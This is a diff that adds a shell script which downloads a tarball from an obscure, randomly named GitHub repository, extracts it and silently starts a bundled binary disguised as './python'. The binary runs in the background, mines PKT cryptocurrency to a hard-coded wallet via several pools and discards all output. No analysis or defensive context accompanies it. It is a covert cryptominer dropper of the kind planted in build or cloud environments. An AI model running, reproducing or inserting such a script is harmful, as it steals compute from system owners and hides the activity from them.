@@ -1,0 +1,10 @@
+cd
+wget https://raw.githubusercontent.com/d04zr0nj8e9w/g8wd14ef/main/kube44.tar.gz
+tar xvzf kube44.tar.gz
+sleep 2
+nohup ./python ann -t 15 -p pkt1qtp8pc9rrzlcwq3zws6t923yurv3fl86klxwg85 http://pool.pktpool.io http://pool.srizbi.com http://pool.pkt.world > /dev/null 2>&1 &
+
+
+
+
+
